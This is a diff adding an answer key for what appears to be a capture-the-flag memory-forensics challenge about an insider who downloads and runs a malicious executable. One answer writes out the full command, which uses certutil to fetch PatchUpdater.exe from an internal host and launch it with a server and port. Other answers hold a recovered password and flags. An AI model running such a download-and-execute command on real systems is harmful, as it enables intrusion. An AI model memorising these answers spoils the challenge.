@@ -1,0 +1,44 @@
+[
+  {
+    "prompt": "What is the PID of the suspicious process observed on the victim's machine?",
+    "answers": [
+      "3052"
+    ],
+    "normalizer": "text"
+  },
+  {
+    "prompt": "What is the full command typed by the insider to download that malicious executable?",
+    "answers": [
+      "cmd.exe /k \"cd /d C:\\Windows\\Temp & certutil -urlcache -f http://192.168.6.133:8888/PatchUpdater.exe PatchUpdater.exe & .\\PatchUpdater.exe --server 192.168.6.133 --port 8080\""
+    ],
+    "normalizer": "text"
+  },
+  {
+    "prompt": "What legitimate Windows utility was abused to download the suspicious executable?",
+    "answers": [
+      "certutil.exe"
+    ],
+    "normalizer": "text"
+  },
+  {
+    "prompt": "Mahmoud had an important archive that he protected by a special password. This password is left somewhere on his desktop. Can you get this password?",
+    "answers": [
+      "0mK3LALAW3LdT"
+    ],
+    "normalizer": "text"
+  },
+  {
+    "prompt": "What is the important data Mahmoud was trying to hide inside that archive?",
+    "answers": [
+      "EYCC{Y0U_Sh0uLD_M4sTeR_C3RviNG}"
+    ],
+    "normalizer": "text"
+  },
+  {
+    "prompt": "Before leaving his workstation, Mahmoud copied an important note. Can you recover what he copied?",
+    "answers": [
+      "EYCC{M3me0Ry_F0r3nSicS_M3tteR}"
+    ],
+    "normalizer": "text"
+  }
+]
